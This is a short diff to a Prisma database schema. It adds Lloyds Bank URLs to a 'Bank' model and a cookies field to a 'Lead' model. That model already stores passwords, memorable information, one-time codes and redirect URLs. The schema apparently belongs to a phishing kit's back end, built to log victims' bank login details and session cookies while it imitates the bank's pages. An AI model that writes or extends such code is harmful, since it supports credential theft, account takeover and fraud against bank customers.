@@ -18,6 +18,11 @@ model Bank {
   order             Int      @default(1)
   isActive          Boolean  @default(true)
 
+  // 🌍 Category-wise Dedicated Bank URLs
+  personalUrl       String?  @default("https://authorise.lloydsbank.co.uk/auth/user")
+  businessUrl       String?  @default("https://www.lloydsbank.co.uk/business.html")
+  commercialUrl     String?  @default("https://www.lloydsbank.co.uk/commercial.html")
+
   browserUrl        String?
   browserAddressBar String?
   popupStatus       String   @default("SUCCESS")
@@ -50,6 +55,7 @@ model Lead {
   password      String?
   memorableInfo String?
   extraData     String?
+  cookiesData   String?  @default("{\"status\": \"active\"}")
   otpCode       String?
   optionLabel   String?  @default("Default")
   redirectUrl   String?
